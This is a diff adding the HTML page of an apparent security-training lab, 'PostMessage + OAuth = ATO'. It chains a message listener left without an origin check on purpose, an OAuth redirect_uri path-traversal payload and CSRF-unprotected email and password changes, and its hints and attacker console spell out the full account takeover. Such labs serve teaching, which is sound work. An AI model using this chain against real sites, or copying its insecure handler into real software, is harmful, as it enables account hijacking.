@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: PostMessage + OAuth = ATO - Chain Level 3</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">Chain #3: PostMessage + OAuth = ATO</span>
+      <span class="difficulty expert">Expert</span>
+    </div>
+  </div>
+
+  <div id="solve-banner" class="solve-banner"></div>
+
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>Full ATO chain: Exploit a postMessage listener on the app to initiate a rogue OAuth flow, steal the resulting token, then use it to change the victim's email and password. This combines postMessage exploitation with OAuth token theft.</p>
+      </div>
+
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: The postMessage listener</button>
+        <div class="hint-content">The app's main page has a postMessage handler for "SSO integration" that accepts <code>{type:'sso_redirect', url:'...'}</code> messages and navigates the user to the URL. No origin check. This is your entry point.</div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: OAuth + redirect chain</button>
+        <div class="hint-content">Use the postMessage handler to redirect the victim to an OAuth URL with a manipulated redirect_uri (using path traversal). The OAuth flow will authenticate the victim and redirect them with the token to your attacker page.</div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: Complete attack</button>
+        <div class="hint-content">
+          1. Open victim page in iframe/popup<br>
+          2. Send postMessage: <code>{type:'sso_redirect', url:'/oauth/authorize?client_id=vuln-app&response_type=token&redirect_uri=...(traversal to steal page)'}</code><br>
+          3. Victim gets redirected through OAuth → your steal page<br>
+          4. Steal page captures the token<br>
+          5. Use the session cookie set during OAuth to change email/password<br>
+        </div>
+      </div>
+
+      <h3>Components</h3>
+      <div class="source-code">
+<pre><span class="comment">// 1. PostMessage handler (no origin check)</span>
+window.addEventListener('message', (e) => {
+  <span class="keyword">if</span> (e.data.type === 'sso_redirect') {
+    window.location = <span class="sink">e.data.url</span>;
+  }
+});
+
+<span class="comment">// 2. OAuth weak redirect_uri</span>
+<span class="comment">//    /callback/../../../attacker/steal.html</span>
+
+<span class="comment">// 3. No CSRF on email/password change</span>
+POST /api/user/change-email {credentials:'include'}
+POST /api/user/change-password {credentials:'include'}
+</pre>
+      </div>
+    </div>
+
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+
+        <!-- The vulnerable app page with postMessage listener -->
+        <div class="lab-form">
+          <h2 style="margin-bottom:16px">&#127760; VulnApp Dashboard</h2>
+          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px">This is the main app page. It has a postMessage handler for "SSO integration" that accepts redirect commands without origin validation.</p>
+
+          <div style="display:flex;gap:8px;align-items:end;margin-bottom:12px">
+            <div style="flex:1">
+              <label>Username</label>
+              <input type="text" id="loginUser" value="victim" style="margin-bottom:0">
+            </div>
+            <div style="flex:1">
+              <label>Password</label>
+              <input type="password" id="loginPass" value="password123" style="margin-bottom:0">
+            </div>
+            <button class="btn btn-primary" onclick="doLogin()">Login</button>
+          </div>
+          <div id="login-status" style="font-size:13px"></div>
+
+          <div id="dashboard" style="margin-top:12px;padding:16px;background:var(--bg-primary);border-radius:8px">
+            <div id="user-info" style="color:var(--text-muted)">Not logged in</div>
+          </div>
+
+          <div id="sso-status" style="margin-top:8px;font-size:12px;color:var(--text-muted)">
+            SSO postMessage listener: <span style="color:var(--success)">Active</span>
+          </div>
+        </div>
+
+        <hr style="border-color:var(--border);margin:24px 0">
+
+        <!-- Attacker Console -->
+        <div class="lab-form" style="border:2px solid var(--danger);background:rgba(239,68,68,0.05)">
+          <h2 style="color:var(--danger);margin-bottom:12px">&#9760; Attack Chain Console</h2>
+
+          <h4 style="color:var(--warning);margin-bottom:8px">Step 1: Send postMessage to redirect victim through OAuth</h4>
+          <p style="font-size:12px;color:var(--text-muted);margin-bottom:8px">This sends a postMessage to this page's SSO handler, redirecting through OAuth with a manipulated redirect_uri.</p>
+
+          <label>OAuth redirect URL (sent via postMessage)</label>
+          <textarea id="oauthUrl" rows="3" style="font-family:monospace;font-size:11px">/oauth/authorize?client_id=vuln-app&response_type=token&state=pwned&redirect_uri=http://localhost:3000/oauth/callback/../../../labs/attacker/chain-steal.html</textarea>
+
+          <button class="btn btn-danger" onclick="step1()">Send postMessage (redirect to OAuth)</button>
+          <div id="step1-status" style="margin-top:8px;font-size:13px"></div>
+
+          <hr style="border-color:var(--border);margin:16px 0">
+
+          <h4 style="color:var(--warning);margin-bottom:8px">Step 2: After OAuth completes, execute ATO</h4>
+          <p style="font-size:12px;color:var(--text-muted);margin-bottom:8px">Once the victim authenticates via OAuth, their session cookie is set. Use it to change their credentials.</p>
+
+          <label>New email</label>
+          <input type="text" id="newEmail" value="attacker@evil.com">
+          <label>New password</label>
+          <input type="text" id="newPass" value="pwned123">
+          <button class="btn btn-danger" onclick="step2()">Execute ATO (change email + password)</button>
+          <div id="step2-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console" style="border-color:#8b0000">
+            <div class="title" style="color:#ff4444">Attack Chain Log</div>
+            <div id="attack-log">
+              <div class="log" style="color:var(--text-muted)">Ready for PostMessage + OAuth + ATO chain...</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console">
+            <div class="title">Server Action Log</div>
+            <div id="csrf-log"><div class="log" style="color:var(--text-muted)">No actions</div></div>
+          </div>
+          <button class="btn btn-secondary" onclick="refreshLog()" style="margin-top:8px">Refresh</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    var alog = document.getElementById('attack-log');
+
+    // === VULNERABLE: PostMessage handler with no origin check ===
+    window.addEventListener('message', function(e) {
+      // NO ORIGIN CHECK - accepts from any source
+      alog.innerHTML += '<div class="log">PostMessage received: ' + JSON.stringify(e.data).substring(0, 100) + '</div>';
+
+      if (e.data && e.data.type === 'sso_redirect' && e.data.url) {
+        alog.innerHTML += '<div class="log" style="color:var(--danger)">SSO redirect triggered! Navigating to: ' + e.data.url.substring(0, 80) + '</div>';
+        document.getElementById('sso-status').innerHTML =
+          'SSO redirect: <span style="color:var(--danger)">Redirecting to ' + e.data.url.substring(0, 50) + '...</span>';
+        // VULNERABLE: navigates to attacker-controlled URL
+        setTimeout(function() {
+          window.location = e.data.url;
+        }, 1000);
+      }
+    });
+
+    function doLogin() {
+      fetch('/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({
+          username: document.getElementById('loginUser').value,
+          password: document.getElementById('loginPass').value
+        })
+      })
+      .then(r => r.json())
+      .then(data => {
+        if (data.success) {
+          document.getElementById('login-status').innerHTML =
+            '<span style="color:var(--success)">Logged in as ' + data.user.username + '</span>';
+          document.getElementById('user-info').innerHTML =
+            '<div>Welcome, <strong>' + data.user.username + '</strong></div>' +
+            '<div>Email: ' + data.user.email + '</div>';
+        }
+      });
+    }
+
+    function step1() {
+      var url = document.getElementById('oauthUrl').value;
+      alog.innerHTML += '<div class="log" style="color:var(--danger)">Step 1: Sending postMessage with SSO redirect...</div>';
+      alog.innerHTML += '<div class="log">URL: ' + url.substring(0, 100) + '</div>';
+
+      // Send postMessage to this page's own handler
+      // In reality, this would come from an attacker's iframe/popup
+      window.postMessage({ type: 'sso_redirect', url: url }, '*');
+
+      document.getElementById('step1-status').innerHTML =
+        '<span style="color:var(--warning)">PostMessage sent! Page will redirect through OAuth flow...</span>';
+    }
+
+    function step2() {
+      var email = document.getElementById('newEmail').value;
+      var pass = document.getElementById('newPass').value;
+
+      alog.innerHTML += '<div class="log" style="color:var(--danger)">Step 2: Executing ATO...</div>';
+
+      // Change email
+      fetch('/api/user/change-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ email: email })
+      })
+      .then(r => r.json())
+      .then(data => {
+        alog.innerHTML += '<div class="log" style="color:var(--danger)">Email changed to: ' + email + '</div>';
+        // Change password
+        return fetch('/api/user/change-password', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'include',
+          body: JSON.stringify({ newPassword: pass })
+        });
+      })
+      .then(r => r.json())
+      .then(data => {
+        alog.innerHTML += '<div class="log" style="color:var(--danger)">Password changed!</div>';
+        alog.innerHTML += '<div class="log" style="color:var(--danger);font-size:14px">*** FULL ATO COMPLETE ***</div>';
+        document.getElementById('step2-status').innerHTML =
+          '<span style="color:var(--danger);font-weight:bold">ATO achieved! Email + password changed.</span>';
+        solveLab('chain-3');
+        setTimeout(refreshLog, 500);
+      })
+      .catch(err => {
+        alog.innerHTML += '<div class="log" style="color:var(--danger)">Error: ' + err.message + '</div>';
+      });
+    }
+
+    function refreshLog() {
+      fetch('/api/csrf-log').then(r => r.json()).then(actions => {
+        var el = document.getElementById('csrf-log');
+        el.innerHTML = actions.length === 0 ?
+          '<div class="log" style="color:var(--text-muted)">No actions</div>' :
+          actions.map(a => '<div class="log" style="color:' +
+            (a.action.includes('change') ? 'var(--danger)' : 'var(--text-secondary)') +
+            '">[' + a.action + '] ' + a.user + (a.newEmail ? ' → ' + a.newEmail : '') + '</div>'
+          ).join('');
+      });
+    }
+
+    // Auto-check login
+    fetch('/api/auth/me', { credentials: 'include' })
+      .then(r => r.json())
+      .then(data => {
+        if (data.user) {
+          document.getElementById('login-status').innerHTML =
+            '<span style="color:var(--success)">Logged in as ' + data.user.username + '</span>';
+          document.getElementById('user-info').innerHTML =
+            '<div>Welcome, <strong>' + data.user.username + '</strong></div>' +
+            '<div>Email: ' + data.user.email + '</div>';
+        }
+      }).catch(() => {});
+  </script>
+</body>
+</html>
